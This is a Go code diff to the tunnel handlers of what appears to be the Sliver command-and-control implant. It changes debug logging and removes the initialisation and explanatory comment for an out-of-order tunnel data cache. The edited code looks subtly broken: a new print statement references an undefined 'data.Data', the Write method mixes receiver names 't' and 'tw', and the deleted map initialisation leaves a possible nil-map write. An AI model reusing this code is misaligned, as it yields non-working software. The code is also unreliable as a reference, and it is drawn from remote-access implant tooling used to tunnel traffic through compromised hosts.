@@ -64,8 +64,6 @@ func GetTunnelHandlers() map[uint32]TunnelHandler {
 }
 
 func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	fmt.Println("call to tunnelCloseHandler()")
-
 	tunnelClose := &sliverpb.TunnelData{
 		Closed: true,
 	}
@@ -89,21 +87,8 @@ func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	proto.Unmarshal(envelope.Data, tunnelData)
 	tunnel := connection.Tunnel(tunnelData.TunnelID)
 	if tunnel != nil {
-
-		if _, ok := tunnelDataCache[tunnelData.TunnelID]; !ok {
-			tunnelDataCache[tunnelData.TunnelID] = map[uint64]*sliverpb.TunnelData{}
-		}
-
-		// Since we have no guarantees that we will receive tunnel data in the correct order, we need
-		// to ensure we write the data back to the reader in the correct order. The server will ensure
-		// that TunnelData protobuf objects are numbered in the correct order using the Sequence property.
-		// Similarly we ensure that any data we write-back to the server is also numbered correctly. To
-		// reassemble the data, we just dump it into the cache and then advance the writer until we no longer
-		// have sequential data. So we can receive `n` number of incorrectly ordered Protobuf objects and
-		// correctly write them back to the reader.
-
-		// {{if .Config.Debug}}
-		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", tunnel.ID, tunnelData.Sequence)
+		// {{if .Debug}}
+		fmt.Printf("[tunnel] Read %d bytes from tunnel %d\n", len(data.Data), tunnel.ID)
 		// {{end}}
 		tunnelDataCache[tunnel.ID][tunnelData.Sequence] = tunnelData
 
@@ -139,7 +124,9 @@ type tunnelWriter struct {
 }
 
 func (t tunnelWriter) Write(data []byte) (n int, err error) {
-	fmt.Printf("Writing %d bytes to the tunnel\n", len(data))
+	// {{if .Debug}}
+	fmt.Printf("[tunnel] Write %d bytes to tunnel %d\n", len(data), t.tun.ID)
+	// {{end}}
 	data, err = proto.Marshal(&sliverpb.TunnelData{
 		Sequence: tw.tun.WriteSequence, // The tunnel write sequence
 		TunnelID: tw.tun.ID,
@@ -290,7 +277,6 @@ func tcpTunnelReqHandler(envelope *sliverpb.Envelope, connection *transports.Con
 			byteArrayRead := make([]byte, 1024)
 			bytesRead, err := tunnel.Reader.Read(byteArrayRead)
 			if bytesRead != 0 {
-				fmt.Printf("Read %d bytes from socket\n", bytesRead)
 				tWriter.Write(byteArrayRead[:bytesRead])
 			} else if err != nil && strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") {
 				// Socket has been closed by remote host
